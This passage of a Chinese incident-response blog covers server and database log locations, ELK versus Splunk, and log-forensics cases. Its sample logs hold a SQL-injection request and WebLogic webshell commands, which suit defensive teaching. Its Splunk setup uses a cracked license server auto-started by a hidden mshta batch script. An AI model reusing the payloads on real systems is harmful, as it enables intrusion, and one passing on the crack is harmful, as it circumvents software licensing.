class="string">&#x27;&quot;upstream_addr&quot;:&quot;$upstream_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;upstream_response_time&quot;:&quot;$upstream_response_time&quot;&#125;&#x27;</span>;</span><br><span class="line"> <span class="comment"># 将上方的规则名称写到最后</span></span><br><span class="line"> access_log /var/log/nginx/access.log json;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>&quot;@timestamp&quot;: &quot;$time_iso8601&quot;</code> - 请求的时间戳，使用ISO 8601格式表示。</li>
+<li><code>&quot;domain&quot;: &quot;$host&quot;</code> - 请求的域名，即客户端请求的主机名。</li>
+<li><code>&quot;host&quot;: &quot;$server_addr&quot;</code> - 服务器的IP地址。</li>
+<li><code>&quot;clientip&quot;: &quot;$remote_addr&quot;</code> - 客户端的IP地址，即发起请求的客户端的IP地址。</li>
+<li><code>&quot;remote_user&quot;: &quot;$remote_user&quot;</code> - 已经验证的远程用户，如果没有则为空。</li>
+<li><code>&quot;request&quot;: &quot;$request&quot;</code> - 请求行，包含请求方法、请求的URI和HTTP版本。</li>
+<li><code>&quot;request_method&quot;: &quot;$request_method&quot;</code> - 请求方法，例如GET、POST等。</li>
+<li><code>&quot;uri&quot;: &quot;$uri&quot;</code> - 请求的URI（不包含查询字符串）。</li>
+<li><code>&quot;request_time&quot;: &quot;$request_time&quot;</code> - 请求的处理时间，单位是秒，记录从接收到完整请求到发送响应的时间。</li>
+<li><code>&quot;status&quot;: &quot;$status&quot;</code> - HTTP状态码，表示服务器对请求的响应状态。</li>
+<li><code>&quot;http_referrer&quot;: &quot;$http_referer&quot;</code> - 引用页面（Referer），表示发起请求的来源页面。</li>
+<li><code>&quot;body_bytes_sent&quot;: &quot;$body_bytes_sent&quot;</code> - 发送给客户端的响应字节数，不包括响应头的大小。</li>
+<li><code>&quot;xff&quot;: &quot;$http_x_forwarded_for&quot;</code> - <code>X-Forwarded-For</code>头的值，通常用于记录代理服务器或负载均衡之前的客户端IP地址。</li>
+<li><code>&quot;http_user_agent&quot;: &quot;$http_user_agent&quot;</code> - 用户代理字符串，表示发起请求的客户端软件的信息（比如操作系统和浏览器版本）。</li>
+<li><code>&quot;upstream_addr&quot;: &quot;$upstream_addr&quot;</code> - 上游服务器的地址，如果请求被代理到其他服务器，这里记录上游服务器的IP地址。</li>
+<li><code>&quot;upstream_response_time&quot;: &quot;$upstream_response_time&quot;</code> - 上游服务器的响应时间，单位是秒，记录从Nginx向上游服务器发起请求到收到完整响应的时间。</li>
+</ol>
+<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><ol>
+<li><p>默认在<code>Tomcat_HOME/logs/</code></p>
+</li>
+<li><p><code>/usr/local/tomcat/logs/</code></p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在tomcat/conf下的server.xml中 配置如下:</span></span><br><span class="line">&lt;Valve className=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span>  </span><br><span class="line">directory=<span class="string">&quot;logs&quot;</span> prefix=<span class="string">&quot;localhost_access_log.&quot;</span> suffix=<span class="string">&quot;.txt&quot;</span> pattern=<span class="string">&quot;%h %l %u %t &quot;</span>%r<span class="string">&quot; %s %b&quot;</span> /&gt;</span><br><span class="line"><span class="comment"># 日志格式说明:</span></span><br><span class="line"><span class="comment"># %h 远程的主机名或IP</span></span><br><span class="line"><span class="comment"># %l 远程的逻辑用户名</span></span><br><span class="line"><span class="comment"># %u 通过身份验证的远程用户</span></span><br><span class="line"><span class="comment"># %t 通用日志格式的日期和时间</span></span><br><span class="line"><span class="comment"># %r 请求</span></span><br><span class="line"><span class="comment"># %s 返回的HTTP状态码</span></span><br><span class="line"><span class="comment"># %b 响应中发送的字节，不包括HTTP头</span></span><br><span class="line"></span><br><span class="line">192.168.1.1 - john [31/Oct/2023:14:20:15 +0800] <span class="string">&quot;GET /index.php?id=1&#x27; and 1=2 union select 1,2,3 from infomation_schmea.tables where table_schmea=database()&#x27; HTTP/1.1&quot;</span> 200 1234</span><br></pre></td></tr></table></figure>
+
+<h3 id="Vsftp"><a href="#Vsftp" class="headerlink" title="Vsftp"></a>Vsftp</h3><ol>
+<li>统一存放在<code>/var/log/message</code></li>
+<li>可通过编辑<code>/etc/vsftp/vsftp.conf</code>配置文件修改日志位置</li>
+</ol>
+<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><ol>
+<li>access.log<ol>
+<li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/servername/logs</code>(默认位置)</li>
+<li>主要记录http请求，默认情况下日志记录处于启用状态，服务器将http请求保存在单独的日志文件中，日志格式如下，主要记录了http请求请求ip地址、请求时间、访问页面、响应状态等信息</li>
+</ol>
+</li>
+<li><code>server.log</code><ol>
+<li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/AdminServer/logs</code></li>
+</ol>
+</li>
+<li>域日志<code>domain.log</code><ol>
+<li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/AdminServer/logs</code></li>
+</ol>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;POST /ws_utc/resources/setting/keystore?timestamp=1721198675696 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=id 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=id 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /favicon.ico 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=whoami 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=ls%20/opt 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=ls 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=cd%20config&amp;&amp;ls 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=cd%20config&amp;ls 1.1&quot;</span> - -</span><br></pre></td></tr></table></figure>
+
+<h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><p>JBoss的日志文件通常存储在安装目录的<code>server/default/log</code>路径下.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/jboss/jboss-4.2.3.GA/server/default/log</span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>在Oracle数据库中，可以使用以下SQL查询来查看日志文件路径：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$logfile;</span><br><span class="line"># 显示日志文件的详细信息，包括文件名和路径。</span><br></pre></td></tr></table></figure>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>要查看MySQL是否启用了日志记录以及日志文件的位置，可以使用以下命令：</p>
+<h4 id="检查是否启用日志"><a href="#检查是否启用日志" class="headerlink" title="检查是否启用日志"></a>检查是否启用日志</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;log_%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这将列出所有与日志相关的变量及其状态，通常包括以下几项：</p>
+<ul>
+<li><code>log_bin</code></li>
+<li><code>log_error</code></li>
+<li><code>log_output</code></li>
+<li><code>log_queries_not_using_indexes</code></li>
+<li><code>log_slave_updates</code></li>
+<li><code>log_slow_admin_statements</code></li>
+<li><code>log_slow_slave_statements</code></li>
+<li><code>log_slow_rate_limit</code></li>
+<li><code>log_timestamps</code></li>
+</ul>
+<h4 id="查看通用日志位置"><a href="#查看通用日志位置" class="headerlink" title="查看通用日志位置"></a>查看通用日志位置</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 检查是否启用了通用查询日志</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log&#x27;</span>;</span><br><span class="line"># 显示通用查询日志的文件路径</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log_file&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，MySQL的日志文件可能位于:<code>/var/log/mysql</code>.也可通过查看配置文件确定日志路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2021-08-09T03:05:39.193260Z 162 [Note] Access denied <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;192.168.23.206&#x27;</span> (using password: YES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2021-08-09：日期，表示日志记录的日期是2021年8月9日。</span></span><br><span class="line"><span class="comment"># T：日期和时间的分隔符。</span></span><br><span class="line"><span class="comment"># 03:05:39.193260：时间，表示日志记录的时间是03:05:39.193260，精确到微秒。</span></span><br><span class="line"><span class="comment"># Z：表示时间是以UTC时间记录的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 162：连接ID，表示这是由ID为162的连接产生的日志。连接ID是MySQL分配给每个连接的唯一标识符。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Note]：日志级别，表示这是一条注释信息。MySQL的日志级别通常包括ERROR、WARNING和NOTE。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Access denied for user &#x27;root&#x27;@&#x27;192.168.23.206&#x27;：错误消息，表示用户root尝试从IP地址192.168.23.206连接到MySQL服务器，但访问被拒绝。</span></span><br><span class="line"><span class="comment"># (using password: YES)：附加信息，表示该用户确实提供了密码，但认证失败。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>使用<code>SQL Server Management Studio (SSMS)</code>查看<code>Microsoft SQL Server</code>的日志文件</p>
+<ol>
+<li>打开<code>SQL Server Management Studio (SSMS)</code></li>
+<li>连接<code>SQL Server</code>实例。</li>
+<li>在对象资源管理器中，展开<code>SQL Server</code>实例。</li>
+<li>展开“管理”文件夹。</li>
+<li>选择<code>SQL Server Logs</code>以查看日志文件。</li>
+</ol>
+<h2 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h2><p>日志分析是任何IT基础设施管理的关键组成部分。它可帮助了解系统运行情况、监控安全事件、遵守法规要求以及进行故障排除。以下是目前市场上两个非常流行的日志分析工具ELK（Elasticsearch, Logstash, Kibana）和Splunk的介绍、使用方法以及优劣势比较。</p>
+<h3 id="ELK-Stack"><a href="#ELK-Stack" class="headerlink" title="ELK Stack"></a>ELK Stack</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>ELK是三个开源项目的组合：Elasticsearch、Logstash和Kibana。Elasticsearch是一个搜索和分析引擎，Logstash用于服务器端数据处理管道，它同时收集数据并在传输到Elasticsearch之前进行处理，Kibana则是数据可视化的前端组件。</p>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><div class="tag-plugin link dis-select"><a class="link-card plain" title="从零搭建日志采集报警系统ELK" href="https://jiangjiyue.github.io/wiki/MonitoringTechDocs/%E5%9B%9B.%20%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9FELK.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill=""><div class="left"><span class="title">从零搭建日志采集报警系统ELK</span><span class="cap link footnote">https://jiangjiyue.github.io/wiki/MonitoringTechDocs/%E5%9B%9B.%20%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9FELK.html</span></div><div class="right"><div class="lazy img" data-bg="https://www.elastic.co/favicon.ico"></div></div></a></div>
+
+<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul>
+<li>开源且免费（有收费的X-Pack扩展）。</li>
+<li>高度可定制，可以根据需求安装插件。</li>
+<li>社区支持强大。</li>
+<li>良好的数据聚合能力。</li>
+</ul>
+<h4 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h4><ul>
+<li>设置和维护相对困难，需要一定的技术知识。</li>
+<li>性能可能受到大数据量影响。</li>
+<li>高级功能需要支付额外费用。</li>
+</ul>
+<h3 id="Splunk"><a href="#Splunk" class="headerlink" title="Splunk"></a>Splunk</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>Splunk是一种商业日志管理和分析工具，提供实时数据监控、搜索、分析等功能。相比于ELK，Splunk是一个封闭源代码的产品，但它提供了强大的功能和易用性。</p>
+<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><ol>
+<li>双击setup.msc</li>
+</ol>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951953.png" alt="image-20240717163701892"></p>
+<ol start="2">
+<li><p>勾选许可协议并自定义选项 </p>
+<p>​	<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951991.png" alt="image-20240717163752079"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951767.png" alt="image-20240717163935546"></p>
+</li>
+<li><p>点击<code>Next</code>选择第一个并下一步</p>
+<ol>
+<li><code>Local System</code> 只能通过127.0.0.1访问</li>
+<li><code>Domain Account</code>可以通过域名或IP访问</li>
+</ol>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951665.png" alt="image-20240717164013603"></p>
+</li>
+<li><p>设置用户名及密码,不要有特殊字符</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951205.png" alt="image-20240717164124963"></p>
+</li>
+<li><p>点击<code>Install</code>等待安装完成,时间会长一些</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951611.png" alt="image-20240717165923423"></p>
+</li>
+<li><p>从浏览器访问<code>127.0.0.1:8000</code>输入安装时的账户密码即可登录</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951041.png" alt="image-20240717170102192"></p>
+</li>
+<li><p>登陆—&gt;右上角设置–&gt;授权</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952432.png" alt="image-20240717170215820"></p>
+</li>
+<li><p>选择更改为对等节点</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952133.png" alt="image-20240717170256495"></p>
+</li>
+<li><p>选择第二个</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952512.png" alt="image-20240717170321133"></p>
+</li>
+<li><p>解压压缩包中的<code>I_LOVE_DVT.rar</code>–&gt;<code>dvt-splunk_licsrv</code>–&gt;<code>windows</code>—&gt;选择对应的架构解压出来.双击打开</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952247.png" alt="image-20240717170510565"></p>
+</li>
+<li><p>复制连接到上方输入框中	<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952558.png" alt="image-20240717170553655"></p>
+</li>
+<li><p>点击保存并重启服务器</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952399.png" alt="image-20240717170624839"></p>
+</li>
+</ol>
+<mark class="tag-plugin colorful mark" color="red">每次使用splunk之前都需要打开`dvt-splunk_licsrv.1.0.386.exe`</mark>
+
+<p>可以将下方内容保存为<code>bat</code>文件将此bat文件以及<code>dvt-splunk_licsrv.1.0.386.exe</code>都放在开机自启文件夹内,即可自动启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">REM 如果传入参数为 <span class="string">&quot;h&quot;</span>，则跳转到 :begin 标签</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%1&quot;</span>==<span class="string">&quot;h&quot;</span> goto begin</span><br><span class="line"></span><br><span class="line">REM 使用 mshta 和 VBScript 隐藏命令行窗口并以后台模式运行脚本</span><br><span class="line">start mshta vbscript:createobject(<span class="string">&quot;wscript.shell&quot;</span>).run(<span class="string">&quot;&quot;</span><span class="string">&quot;%~nx0&quot;</span><span class="string">&quot; h&quot;</span>,0)(window.close)&amp;&amp;<span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">:begin</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"></span><br><span class="line">REM 检查 Splunkd 服务是否正在运行</span><br><span class="line">sc query Splunkd | findstr /C:<span class="string">&quot;STATE&quot;</span> | findstr /C:<span class="string">&quot;RUNNING&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel% neq 0 (</span><br><span class="line">    REM 如果服务未运行，则启动它</span><br><span class="line">    <span class="built_in">echo</span> Splunkd service is not running. Starting...</span><br><span class="line">    net start Splunkd</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    REM 如果服务正在运行，则输出相应信息</span><br><span class="line">    <span class="built_in">echo</span> Splunkd service is already running.</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">REM 检查端口 1337 是否没有被监听</span><br><span class="line">netstat -an | findstr /C:<span class="string">&quot;LISTENING&quot;</span> | findstr /C:<span class="string">&quot;1337&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel% neq 0 (</span><br><span class="line">    REM 如果端口未被监听，则启动 dvt-splunk_licsrv.1.0.386.exe</span><br><span class="line">    <span class="built_in">echo</span> Port 1337 is not being listened on. Starting dvt-splunk_licsrv.1.0.386.exe...</span><br><span class="line">    start /b <span class="string">&quot;&quot;</span> <span class="string">&quot;dvt-splunk_licsrv.1.0.386.exe&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    REM 如果端口已被监听，则输出相应信息</span><br><span class="line">    <span class="built_in">echo</span> Port 1337 is already being listened on.</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">endlocal</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><div class="tag-plugin link dis-select"><a class="link-card plain" title="应急响应之Splunk" href="https://jiangjiyue.github.io//2024/07/05/4677b70c/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill=""><div class="left"><span class="title">应急响应之Splunk</span><span class="cap link footnote">https://jiangjiyue.github.io//2024/07/05/4677b70c/</span></div><div class="right"><div class="lazy img" data-bg="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181954536.png"></div></div></a></div>
+
+<h3 id="ELK-vs-Splunk"><a href="#ELK-vs-Splunk" class="headerlink" title="ELK vs Splunk"></a>ELK vs Splunk</h3><ul>
+<li><strong>成本</strong>: ELK更适合预算有限或倾向于使用开源解决方案的组织，而Splunk则提供更全面的服务，但价格也相对较高。</li>
+<li><strong>易用性</strong>: Splunk用户界面更直观，上手更快，适合初学者；而ELK可能需要更多的配置和调优。</li>
+<li><strong>功能性</strong>: Splunk通常在功能性方面占优势，特别是在其提供的即时分析和即时反馈方面，而ELK则在数据处理和长期分析方面更灵活。</li>
+</ul>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="服务器入侵取证"><a href="#服务器入侵取证" class="headerlink" title="服务器入侵取证"></a>服务器入侵取证</h3><p>描述：服务器被黑了，黑客留下了key，你能找到吗</p>
+<p>![image-20240717190130949](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717190130949.png)</p>
+<p>将近1000条数据,上传到<code>splunk</code>中进行分析</p>
+<p>![image-20240717193722713](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717193722713.png)</p>
+<p>我们可以看到他尝试文件读取my.cnf和passwd响应码为200很有可能读取成功了,我们去检查一下my.cnf当中有什么信息</p>
+<p>![image-20240717193902919](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717193902919.png)</p>
+<p>找到key了</p>
+<h3 id="找到攻击者IP"><a href="#找到攻击者IP" class="headerlink" title="找到攻击者IP"></a>找到攻击者IP</h3><p>实验：网站入侵，找到攻击者ip</p>
+<p>![image-20240717194115863](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717194115863.png)</p>
+<p>45万条数据·····直接导入splunk</p>
+<p>![image-20240717201649197](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717201649197.png)</p>
+<p>先看一下POST相关的数据,并且对uri进行去重</p>
+<p>![image-20240717202005651](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717202005651.png)</p>
+<p>快速浏览,没什么东西使用语句<code>index=_* OR index=* sourcetype=kk method=GET  | stats count by uri | sort + count</code>可以发现在暴力破解</p>
+<p>![image-20240717204436668](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717204436668.png)</p>
+<p>查看该事件IP</p>
+<p>![image-20240717204503497](E:\Work\WiKi\6. 管理和保护\1. 应急响应\日志.log\assets\image-20240717204503497.png)</p>
+
